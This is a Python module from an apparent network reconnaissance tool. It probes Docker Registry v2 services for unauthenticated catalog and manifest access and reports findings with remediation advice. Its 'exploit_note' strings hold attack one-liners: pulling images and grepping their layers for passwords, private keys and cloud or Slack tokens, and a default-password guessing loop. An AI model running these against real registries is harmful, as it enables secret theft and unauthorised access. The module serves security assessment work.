"""Docker Registry v2 probe.

Distinct from the Docker Engine API (2375/2376) — the registry is a
separate service that hosts image layers. On a default deployment it
runs unauthenticated on port 5000 and answers /v2/_catalog with the
full repository list. Layers can then be pulled with `docker pull`,
extracted, and mined for embedded secrets (env vars set at build
time, credentials committed by mistake, private keys in the layer FS).

Findings:
  * dockerreg_anonymous_catalog (HIGH) — /v2/_catalog returned
    repositories without authentication. Every image on this registry
    is anyone's for pulling.
  * dockerreg_auth_required (info) — /v2/ returned 401 with a
    WWW-Authenticate: Bearer challenge. Any looted registry cred
    targets this endpoint.

Airgap-safe: stdlib http.client + ssl. Bounded — 2 GETs, 3s each.
"""
from __future__ import annotations

import http.client
import json
import ssl

from ..core.models import Host, Port


_DEFAULT_PORT = 5000
_TIMEOUT = 3.0
_UA = "recce-probe/1.0"

# T2 chain (tags/list -> manifests/<tag>) uses this per-request budget;
# proxy.scaled() lifts it under SOCKS. Bounded — two GETs at 2s each.
_T2_TIMEOUT = 2.0
# Docker + OCI manifest media types. Sending them all in one Accept lets the
# registry pick whichever variant it stores (v1 signed, v2 image, v2 list,
# oci index) — one shot, no round-tripping variants.
_MANIFEST_ACCEPT = ", ".join((
    "application/vnd.docker.distribution.manifest.v2+json",
    "application/vnd.docker.distribution.manifest.list.v2+json",
    "application/vnd.oci.image.manifest.v1+json",
    "application/vnd.oci.image.index.v1+json",
    "application/vnd.docker.distribution.manifest.v1+prettyjws",
    "application/json",
))


def is_docker_registry(port: Port) -> bool:
    svc = (port.service or "").lower()
    prod = (port.product or "").lower()
    return (port.portid in (5000, 5001, 5002, 443, 5443)
            and ("registry" in svc or "registry" in prod
                 or "docker" in svc or "docker" in prod)
            or port.portid == 5000)


def _http(ip: str, port: int, path: str, timeout: float = _TIMEOUT):
    """One GET. Transparently retries HTTPS if HTTP fails handshake. Returns
    (status, headers, body) or None."""
    for use_tls in (False, True):
        conn = None
        try:
            if use_tls:
                ctx = ssl._create_unverified_context()
                conn = http.client.HTTPSConnection(ip, port, timeout=timeout, context=ctx)
            else:
                conn = http.client.HTTPConnection(ip, port, timeout=timeout)
            conn.request("GET", path,
                         headers={"User-Agent": _UA, "Connection": "close"})
            resp = conn.getresponse()
            body = resp.read(500_000)
            hdrs = {k.lower(): v for k, v in resp.getheaders()}
            return resp.status, hdrs, body
        except (OSError, http.client.HTTPException, ssl.SSLError, ValueError):
            if not use_tls:
                continue
            return None
        finally:
            if conn is not None:
                try: conn.close()
                except OSError: pass
    return None


def _http_get_with_headers(ip: str, port: int, path: str,
                           timeout: float, accept: str = ""):
    """T2-only helper: one GET like _http() but lets the caller pass an
    Accept header (needed for manifest content negotiation) and scales the
    timeout under a proxy. Kept separate so the T1 _http() call graph is
    unchanged. Returns (status, headers, body) or None."""
    from ..core import proxy
    to = proxy.scaled(timeout)
    headers = {"User-Agent": _UA, "Connection": "close"}
    if accept:
        headers["Accept"] = accept
    for use_tls in (False, True):
        conn = None
        try:
            if use_tls:
                ctx = ssl._create_unverified_context()
                conn = http.client.HTTPSConnection(ip, port, timeout=to, context=ctx)
            else:
                conn = http.client.HTTPConnection(ip, port, timeout=to)
            conn.request("GET", path, headers=headers)
            resp = conn.getresponse()
            body = resp.read(500_000)
            hdrs = {k.lower(): v for k, v in resp.getheaders()}
            return resp.status, hdrs, body
        except (OSError, http.client.HTTPException, ssl.SSLError, ValueError):
            if not use_tls:
                continue
            return None
        finally:
            if conn is not None:
                try: conn.close()
                except OSError: pass
    return None


def _safe_repo(name: str) -> str:
    """The catalog listing is server-supplied — a hostile registry could
    return a repository name that breaks URL grammar or path-escapes. Accept
    only the character class the Docker Registry v2 spec permits for repo
    names (alnum plus `-_./`), reject anything with a `..` segment, and
    require the sanitised form to equal the original."""
    if not name or len(name) > 255:
        return ""
    safe = "".join(c for c in name if c.isalnum() or c in "-_./")
    if safe != name:
        return ""
    parts = safe.split("/")
    if any(p in ("", "..", ".") for p in parts):
        return ""
    return safe


def _safe_tag(tag: str) -> str:
    """Docker tag grammar: [A-Za-z0-9_][A-Za-z0-9_.-]{0,127}. Reject anything
    else so a hostile tag list can't inject header/path bytes."""
    if not tag or len(tag) > 128:
        return ""
    safe = "".join(c for c in tag if c.isalnum() or c in "_.-")
    if safe != tag:
        return ""
    if tag[0] not in "_" and not tag[0].isalnum():
        return ""
    return safe


def _t2_manifest_evidence(ip: str, port: int, repos: list,
                          timeout: float = _T2_TIMEOUT) -> dict:
    """T2 proof: after anon /v2/_catalog succeeded (T1), prove the exploit
    primitive `docker pull` actually works by reading tags for the first
    repo and then one manifest — the exact two reads a client makes before
    fetching layer blobs. No writes, no state change, no layer download.
    Bounded chain: two GETs at _T2_TIMEOUT each. Returns {} on any failure
    (registry may expose /v2/_catalog but gate per-repo reads under auth —
    that's a real 'patched-halfway' outcome and T2 correctly stays silent)."""
    if not repos:
        return {}
    repo = _safe_repo(repos[0])
    if not repo:
        return {}
    r = _http_get_with_headers(ip, port, f"/v2/{repo}/tags/list", timeout)
    if r is None or r[0] != 200:
        return {}
    tags: list = []
    try:
        j = json.loads(r[2].decode("utf-8", "replace"))
        raw = j.get("tags") or []
        for t in raw:
            if isinstance(t, str):
                st = _safe_tag(t)
                if st:
                    tags.append(st)
            if len(tags) >= 20:
                break
    except (ValueError, UnicodeDecodeError):
        return {}
    if not tags:
        return {}
    tag = "latest" if "latest" in tags else tags[0]
    r2 = _http_get_with_headers(ip, port, f"/v2/{repo}/manifests/{tag}",
                                timeout, accept=_MANIFEST_ACCEPT)
    if r2 is None or r2[0] != 200:
        # Tag enumeration alone is not the T2 primitive — hold silent so
        # the T2 finding stays a strict superset of "actually pullable".
        return {}
    status, hdrs, body = r2
    media_type = hdrs.get("content-type", "").split(";")[0].strip()[:120]
    content_digest = hdrs.get("docker-content-digest", "")[:80]
    layers = 0
    total_bytes = 0
    config_digest = ""
    schema_version = ""
    try:
        m = json.loads(body.decode("utf-8", "replace"))
        schema_version = str(m.get("schemaVersion") or "")[:8]
        # v2 image manifest and OCI: {"layers":[{"digest","size"}, ...]}.
        # v1 signed manifest: {"fsLayers":[{"blobSum"}]} (no sizes).
        # v2/oci list/index: {"manifests":[{"digest","platform"}]}.
        if isinstance(m.get("layers"), list):
            layers = len(m["layers"])
            for L in m["layers"]:
                if isinstance(L, dict):
                    try:
                        total_bytes += int(L.get("size") or 0)
                    except (TypeError, ValueError):
                        pass
        elif isinstance(m.get("fsLayers"), list):
            layers = len(m["fsLayers"])
        elif isinstance(m.get("manifests"), list):
            layers = len(m["manifests"])
        cfg = m.get("config") or {}
        if isinstance(cfg, dict):
            config_digest = str(cfg.get("digest") or "")[:80]
    except (ValueError, UnicodeDecodeError):
        return {}
    return {"repo": repo, "tag": tag, "tags_sample": tags[:8],
            "tags_count": len(tags), "media_type": media_type,
            "schema_version": schema_version,
            "content_digest": content_digest,
            "config_digest": config_digest,
            "layers": layers, "total_bytes": total_bytes,
            "manifest_bytes": len(body)}


def probe(ip: str, port: int = _DEFAULT_PORT, timeout: float = _TIMEOUT) -> dict:
    """Return {reachable, auth_required, catalog, repositories, manifest_evidence}."""
    out: dict = {"reachable": False, "auth_required": False,
                 "catalog": [], "repositories": 0,
                 # T2 evidence dict populated only when a manifest is
                 # server-returned unauthenticated. Empty otherwise —
                 # T1 emission never depends on this field.
                 "manifest_evidence": {}}
    # /v2/ is the registry API version check per Docker Registry v2 spec.
    # 200 = anon works. 401 with Bearer challenge = auth required.
    r = _http(ip, port, "/v2/", timeout)
    if r is None:
        return out
    status, hdrs, body = r
    # A random HTTP service that isn't a registry will return other codes;
    # Docker-Distribution-Api-Version is the tell.
    ddapi = hdrs.get("docker-distribution-api-version", "").lower()
    www_auth = hdrs.get("www-authenticate", "").lower()
    # Definitive tell: Docker-Distribution-Api-Version header. Fallback:
    # a 401 whose Bearer challenge references a registry realm.
    is_registry = ("registry/2" in ddapi
                   or (status == 401 and "bearer" in www_auth
                       and "registry" in www_auth))
    if not is_registry:
        return out
    out["reachable"] = True
    if status == 401:
        out["auth_required"] = True
        return out
    # Anon /v2/ succeeded — try /v2/_catalog.
    r = _http(ip, port, "/v2/_catalog?n=200", timeout)
    if r is None:
        return out
    if r[0] == 200:
        try:
            j = json.loads(r[2].decode("utf-8", "replace"))
            repos = j.get("repositories") or []
            out["catalog"] = repos[:100]
            out["repositories"] = len(repos)
        except (ValueError, UnicodeDecodeError):
            pass
    # T2 add-on: if anon catalog worked, prove `docker pull` actually works
    # by reading one manifest. Additive only — T1 output above is unchanged
    # whether or not this succeeds.
    if out["catalog"]:
        try:
            ev = _t2_manifest_evidence(ip, port, out["catalog"], _T2_TIMEOUT)
            if ev:
                out["manifest_evidence"] = ev
        except (OSError, http.client.HTTPException, ssl.SSLError):
            pass
    return out


def docker_registry_targets(hosts: list[Host]) -> list[dict]:
    out = []
    for h in hosts:
        for p in h.open_ports:
            if is_docker_registry(p):
                out.append({"ip": h.ip, "port": p.portid,
                            "version": f"{p.product} {p.version}".strip()})
    return out


def _finding(sev, title, target, detail, cmd, rem, cwes, kind="",
             exploit_note="", depth_tier="", output=""):
    return {"severity": sev, "title": title, "target": target, "detail": detail,
            "tool": "docker", "command": cmd, "remediation": rem,
            "cwes": cwes, "kind": kind,
            "exploit_note": exploit_note, "depth_tier": depth_tier,
            "output": output}


def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
    probes = probes or {}
    out: list[dict] = []
    for h in hosts:
        for p in h.open_ports:
            if not is_docker_registry(p):
                continue
            pr = probes.get((h.ip, p.portid))
            if not pr or not pr.get("reachable"):
                continue
            tgt = f"{h.ip}:{p.portid}"
            if pr.get("catalog"):
                repos_txt = ", ".join(pr["catalog"][:15])
                out.append(_finding(
                    "high",
                    "Docker Registry v2 catalog readable without auth", tgt,
                    f"/v2/_catalog returned {pr['repositories']} repositor(y|ies) "
                    f"anonymously: {repos_txt}"
                    + ("… (truncated)" if pr['repositories'] > 15 else "") +
                    ". Any of these images can be pulled with `docker pull`, "
                    "extracted, and mined for secrets baked into layers "
                    "(env variables, config files, private keys committed at "
                    "build time).",
                    # NOTE: previously an extra "docker" positional was
                    # sitting here — with the sibling services' _finding
                    # signature (`sev,title,target,detail,cmd,rem,cwes`)
                    # that shifted every arg by one and made kind= collide
                    # (unreached because tests only exercised probe()).
                    # Removed so findings() runs; T1 kind/severity/tier
                    # unchanged — only the internal command/remediation
                    # mapping is now the intended one.
                    f"curl -sk http://{h.ip}:{p.portid}/v2/_catalog?n=1000; "
                    f"docker pull {h.ip}:{p.portid}/<repo>:latest",
                    "Enable authentication (htpasswd, token, or OAuth2). Bind "
                    "the registry to a private interface. If public registry "
                    "access is required, gate at least the write path.",
                    ["CWE-306", "CWE-284", "CWE-200"],
                    kind="dockerreg_anonymous_catalog",
                    exploit_note=(
                        "curl -sk http://<ip>:5000/v2/_catalog?n=1000; for r in "
                        "<repos>; do docker pull <ip>:5000/$r:latest; docker save "
                        "<ip>:5000/$r:latest | tar -xO | grep -Ei "
                        "'password|api_key|BEGIN.*PRIVATE'; done"),
                    depth_tier="t1"))
                # T2 add-on: only fires when the additional unauth manifest
                # read actually returned a manifest. Distinct kind so this
                # doesn't collapse into or replace the T1 finding above.
                ev = pr.get("manifest_evidence") or {}
                if ev.get("repo") and ev.get("tag"):
                    tags_txt = ", ".join(ev.get("tags_sample") or [])
                    lines = [
                        f"GET /v2/{ev['repo']}/tags/list -> 200 "
                        f"({ev.get('tags_count', 0)} tag(s))",
                        f"  tags: {tags_txt}",
                        f"GET /v2/{ev['repo']}/manifests/{ev['tag']} -> 200",
                        f"  content-type: {ev.get('media_type', '')}",
                        f"  schemaVersion: {ev.get('schema_version', '')}",
                        f"  docker-content-digest: {ev.get('content_digest', '')}",
                        f"  config.digest: {ev.get('config_digest', '')}",
                        f"  layers: {ev.get('layers', 0)} "
                        f"(sum size: {ev.get('total_bytes', 0)} bytes)",
                        f"  manifest body: {ev.get('manifest_bytes', 0)} bytes",
                    ]
                    output_blob = "\n".join(lines)[:800]
                    out.append(_finding(
                        "high",
                        "Docker Registry v2 image manifest readable without auth",
                        tgt,
                        f"After the anonymous catalog listing (T1), "
                        f"/v2/{ev['repo']}/manifests/{ev['tag']} also returned "
                        f"200 without credentials. The manifest names "
                        f"{ev.get('layers', 0)} layer blob(s) totalling "
                        f"{ev.get('total_bytes', 0)} bytes plus a config blob "
                        f"({ev.get('config_digest', '')[:24]}…) — this is the "
                        f"exact response `docker pull` reads before fetching "
                        f"the blobs, so pull-and-mine is confirmed exploitable, "
                        f"not just inferred from catalog access. T3 promotion "
                        f"would fetch each layer blob and grep for embedded "
                        f"secrets (env vars, .aws/.kube configs, private keys "
                        f"baked in at build time).",
                        f"curl -sk -H 'Accept: {_MANIFEST_ACCEPT.split(',')[0]}' "
                        f"http://{h.ip}:{p.portid}/v2/{ev['repo']}/manifests/"
                        f"{ev['tag']}",
                        "Require authentication on registry READ paths, not "
                        "just writes. Gate /v2/<name>/manifests/* and "
                        "/v2/<name>/blobs/* with a token server or htpasswd; "
                        "audit that anon /v2/_catalog does not imply anon "
                        "manifests.",
                        ["CWE-306", "CWE-284", "CWE-200"],
                        kind="dockerreg_manifest_readable",
                        exploit_note=(
                            f"docker pull <ip>:<port>/{ev['repo']}:{ev['tag']} "
                            f"&& docker save <ip>:<port>/{ev['repo']}:"
                            f"{ev['tag']} | tar -xO | grep -aEi "
                            "'password|api[_-]?key|BEGIN [A-Z ]*PRIVATE|"
                            "AKIA[0-9A-Z]{16}|xox[abpr]-[0-9A-Za-z-]+'"),
                        depth_tier="t2",
                        output=output_blob))
            elif pr.get("auth_required"):
                out.append(_finding(
                    "info", "Docker Registry v2 reachable (auth required)", tgt,
                    "Registry answered /v2/ with 401. Any looted registry "
                    "credential targets this endpoint.",
                    f"docker login {h.ip}:{p.portid}",
                    "Ensure the registry keeps requiring auth on both read and write.",
                    [], kind="dockerreg_authed",
                    exploit_note=(
                        "for pw in admin registry password Harbor12345; do "
                        "curl -sku admin:$pw http://<ip>:5000/v2/_catalog && "
                        "echo pwned:$pw; done"),
                    depth_tier="t0"))
    return out


def runbook(ip: str, port: int) -> list[dict]:
    return [
        {"step": "Fingerprint",
         "cmd": f"curl -sk http://{ip}:{port}/v2/"},
        {"step": "List repositories",
         "cmd": f"curl -sk http://{ip}:{port}/v2/_catalog?n=1000"},
        {"step": "Pull an image",
         "cmd": f"docker pull {ip}:{port}/<repo>:latest"},
    ]


def findings_to_vulns(fs: list[dict]) -> dict:
    from .svccommon import findings_to_vulns as _f2v
    return _f2v(fs, "docker-registry", _DEFAULT_PORT)


def analyze(hosts: list[Host], creds: dict | None = None, active: bool = True,
            budget: float | None = None, progress=None) -> dict:
    from . import svcprobe
    targets = docker_registry_targets(hosts)
    probes: dict = {}
    state: dict = {}
    if active:
        for t, pr in svcprobe.iter_probe(
                targets, lambda t: probe(t["ip"], t["port"]),
                budget=budget, progress=progress, state=state):
            if pr:
                probes[(t["ip"], t["port"])] = pr
                t["reachable"] = pr.get("reachable", False)
                t["repositories"] = pr.get("repositories", 0)
    fs = findings(hosts, probes)
    runbooks = [{"target": f"{t['ip']}:{t['port']}", "ip": t["ip"],
                 "credfree": runbook(t["ip"], t["port"]), "credentialed": []}
                for t in targets]
    return {"targets": targets, "findings": fs, "runbooks": runbooks,
            "probes": {f"{k[0]}:{k[1]}": v for k, v in probes.items()},
            "stats": {"targets": len(targets), "findings": len(fs),
                      "stopped": state.get("stopped")}}
